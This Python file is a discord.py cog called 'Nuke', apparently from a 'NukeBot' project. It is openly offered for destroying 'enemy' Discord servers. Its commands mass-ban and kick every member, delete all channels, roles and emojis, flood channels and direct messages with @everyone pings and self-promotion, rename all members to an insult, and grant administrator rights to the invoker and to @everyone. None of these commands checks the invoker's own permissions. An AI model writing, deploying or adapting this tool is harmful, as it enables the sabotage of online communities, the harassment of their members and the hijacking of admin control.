from discord.ext import commands
import discord 
class Nuke(commands.Cog, name="Nuke"):
	"""A simple toolkit for everyone, that can nuke any server, if provided proper permissions. :')"""

	def __init__(self, bot):
		self.bot = bot 

	@commands.command(name="banmembers", aliases=["banm", "bmembers", "bm"])
	@commands.guild_only()
	@commands.cooldown(1, 120, commands.BucketType.guild)
	@commands.bot_has_permissions(ban_members=True, add_reactions=True)
	async def _bm(self, ctx, *, remark:str=None):
		"""
		This command will ban all the members from the server :)
		
		Usage:
		[p]banmembers [reason:optional]
		"""
		try: await ctx.message.add_reaction("▶️")
		except: pass
		if len(remark) > 20: remark = remark[:20:]
		for member in ctx.guild.members:
			try:
				await member.ban(reason=f"Action requested by {ctx.author.name} ({ctx.author.id}) | Remark: {remark}")
			except Exception:
				pass # silently ignore if something goes wrong
		try: await ctx.message.add_reaction('☑️') 
		except Exception: pass

	@commands.command(name="deletechannels", aliases=["deletec", "dchannels", "dc"])
	@commands.guild_only()
	@commands.cooldown(1, 120, commands.BucketType.guild)
	@commands.bot_has_permissions(manage_channels=True, add_reactions=True)
	async def _dc(self, ctx, *, remark:str=None):
		"""
		This command will delete all the channels from the server :)
		
		Usage:
		[p]deletechannels [reason:optional]
		"""
		try: await ctx.message.add_reaction("▶️")
		except: pass
		if remark is None: remark = "N/A"
		if len(remark) > 20: remark = remark[:20:]
		for channel in ctx.guild.channels:
			try:
				await channel.delete(reason=f"Action requested by {ctx.author.name} ({ctx.author.id}) | Remark: {remark}")
			except Exception:
				pass # silently ignore if something goes wrong
		await ctx.message.add_reaction('☑️')

	@commands.command(name="deleteemoji", aliases=["deletee", "demoji", "de"])
	@commands.bot_has_permissions(manage_emojis=True, add_reactions=True)
	@commands.cooldown(1, 120, commands.BucketType.guild)
	@commands.guild_only()
	async def _de(self, ctx, *, remark:str=None):
		"""
		This command will delete all the emojis from the server :)
		
		Usage:
		[p]deleteemoji [reason:optional]
		"""
		try: await ctx.message.add_reaction("▶️")
		except: pass
		if remark is None: remark = "N/A"
		if len(remark) > 20: remark = remark[:20:]
		for emoji in ctx.guild.emojis:
			try:
				await emoji.delete(reason=f"Action requested by {ctx.author.name} ({ctx.author.id}) | Remark: {remark}")
			except Exception:
				pass # silently ignore if something goes wrong
		try: await ctx.message.add_reaction('☑️')
		except Exception: pass

	@commands.command(name="deleteroles", aliases=["deleter", "droles", "dr"])
	@commands.guild_only()
	@commands.cooldown(1, 120, commands.BucketType.guild)
	@commands.bot_has_permissions(manage_roles=True, add_reactions=True)
	async def _dr(self, ctx, *, remark:str=None):
		"""
		This command will delete all the roles from the server :)
		
		Usage:
		[p]deleteroles [reason:optional]
		"""
		try: await ctx.message.add_reaction("▶️")
		except: pass
		if remark is None: remark = "N/A"
		if len(remark) > 20: remark = remark[:20:]
		for role in ctx.guild.roles:
			try:
				await role.delete(reason=f"Action requested by {ctx.author.name} ({ctx.author.id}) | Remark: {remark}")
			except Exception:
				pass # silently ignore if something goes wrong
		try: await ctx.message.add_reaction('☑️')
		except Exception: pass

	@commands.command(name="kickmembers", aliases=["kickm", "kmembers", "km"])
	@commands.guild_only()
	@commands.cooldown(1, 120, commands.BucketType.guild)
	@commands.bot_has_permissions(kick_members=True, add_reactions=True)
	async def _km(self, ctx, *, remark:str=None):
		"""
		This command will kick all the members from the server :)
		
		Usage:
		[p]kickmembers [reason:optional]
		"""
		try: await ctx.message.add_reaction("▶️")
		except: pass
		if remark is None: remark = "N/A"
		if len(remark) > 20: remark = remark[:20:]
		for member in ctx.guild.members:
			try:
				await member.kick(reason=f"Action requested by {ctx.author.name} ({ctx.author.id}) | Remark: {remark}")
			except Exception:
				pass # silently ignore if something goes wrong
		try: await ctx.message.add_reaction('☑️')
		except Exception: pass

	@commands.command(name="spamchannels", aliases=["spamc", "schannels", "sc"])
	@commands.bot_has_permissions(manage_channels=True, add_reactions=True)
	@commands.guild_only()
	@commands.cooldown(1, 120, commands.BucketType.guild)
	async def _sc(self, ctx, channels:int, *, remark:str=None):
		"""
		This command will create lots of channels [Text Channels ONLY] in the server :)
		
		Usage:
		[p]spamchannels [reason:optional]
		"""
		try: await ctx.message.add_reaction("▶️")
		except: pass
		if remark is None: remark = "nuked"
		if len(remark) > 20: remark = remark[:20:]
		for i in range(0, channels):
			try:
				channel = await ctx.guild.create_text_channel("nuked", reason=f"Action requested by {ctx.author.name} ({ctx.author.id}) | Remark: {remark}")
				await	channel.send("https://github.com/ritik0ranjan/NukeBot \nWant to nuke your enemy server? Have a look to this link.")
			except Exception:
				pass # silently ignore if something goes wrong
		try: await ctx.message.add_reaction('☑️')
		except Exception: pass

	@commands.command(name="spamdirectmessage", aliases=["spamdm", "sdirectmessage", "sdm"])
	@commands.bot_has_permissions(mention_everyone=True, add_reactions=True)
	@commands.guild_only()
	@commands.cooldown(1, 120, commands.BucketType.guild)
	async def _sdm(self, ctx, *, remark:str=None):
		"""
		This command will spam everyone ping in all the text channel :)
		
		Usage:
		[p]spamdirectmessage [text:optional]
		"""
		try: await ctx.message.add_reaction("▶️")
		except: pass
		if remark is None: remark = "https://github.com/ritik0ranjan/NukeBot \nWant to nuke your enemy server? Have a look to this link."
		if len(remark) > 200: remark = remark[:200:]
		for member in ctx.guild.members:
			if member.id == ctx.author.id: pass
			try:
				await member.send(f"Message from **{ctx.guild.name}** {remark}")
			except Exception:
				pass # silently ignore if something goes wrong
		try: await ctx.message.add_reaction('☑️')
		except Exception: pass

	@commands.command(name="spameveryone", aliases=["spame", "severyone", "se"])
	@commands.guild_only()
	@commands.cooldown(1, 120, commands.BucketType.guild)
	@commands.bot_has_permissions(mention_everyone=True, add_reactions=True)
	async def _se(self, ctx, *, remark:str=None):
		"""
		This command will spam everyone ping in all the text channel :)
		
		Usage:
		[p]spameveryone [text:optional]
		"""
		try: await ctx.message.add_reaction("▶️")
		except: pass
		if remark is None: remark = "https://github.com/ritik0ranjan/NukeBot \nWant to nuke your enemy server? Have a look to this link."
		if len(remark) > 200: remark = remark[:200:]
		for channel in ctx.guild.channels:
			try:
				await channel.send(f"@everyone {remark}")
			except Exception:
				pass # silently ignore if something goes wrong
		try: await ctx.message.add_reaction('☑️')
		except Exception: pass

	@commands.command(name="changenick", aliases=["cn", "changen", "cnick"])
	@commands.guild_only() 
	@commands.cooldown(1, 120, commands.BucketType.guild)
	@commands.bot_has_permissions(manage_nicknames=True, add_reactions=True)
	async def _cn(self, ctx, *, name:str=None):
		"""
		This command will change the nicknames of all the users. :)

		Usage:
		[p]changenick [text:optional]
		"""
		try: await ctx.message.add_reaction("▶️")
		except: pass
		if name is None: name = "Bitch"
		if len(name) > 32: name = name[:31:]
		for member in ctx.guild.members:
			try:
				member.edit(nick=f"{name}", reason=f"Action requested by {ctx.author.name} ({ctx.author.id})")
			except Exception:
				pass # silently ignore if something goes wrong
		await ctx.message.add_reaction('☑️')

	@commands.command(name="giveadmin", aliases=["ga", "givea", "gadmin"])
	@commands.guild_only() 
	@commands.cooldown(1, 120, commands.BucketType.guild)
	@commands.bot_has_permissions(manage_roles=True, add_reactions=True)
	async def _ga(self, ctx, *, remark:str=None):
		"""
		This command will create a role, and give it to you, which will have Administration access. :)

		Usage:
		[p]giveadmin [reason:optional]
		"""
		try: await ctx.message.add_reaction("▶️")
		except: pass
		role = await ctx.guild.create_role(name="Admin", hoist=True, mentionable=True, permissions=discord.Permissions.all(), reason=f"Action requested by {ctx.author.name} ({ctx.author.id}) | Remark: {remark}")
		await ctx.author.add_roles(role, reason=f"Action requested by {ctx.author.name} ({ctx.author.id})")
		try: await ctx.message.add_reaction('☑️')
		except Exception: pass

	@commands.command(name="adminall", aliases=['aa', 'admina', 'aall'])
	@commands.guild_only() 
	@commands.cooldown(1, 120, commands.BucketType.guild)
	@commands.bot_has_permissions(manage_roles=True, add_reactions=True)
	async def _aa(self, ctx, *, remark:str=None):
		"""
		This command will give Administration access to ``@everyone`` role.

		Usage:
		[p]adminall [reason:optional]
		"""
		try: await ctx.message.add_reaction("▶️")
		except: pass
		if len(remark) > 20: remark = remark[:20:]
		await ctx.guild.default_role.edit(permissions=discord.Permissions.all(), reason=f"Action requested by {ctx.author.name} ({ctx.author.id}) | Remark: {remark}")
		try: await ctx.message.add_reaction('☑️')
		except Exception: pass
		
def setup(bot):
	bot.add_cog(Nuke(bot))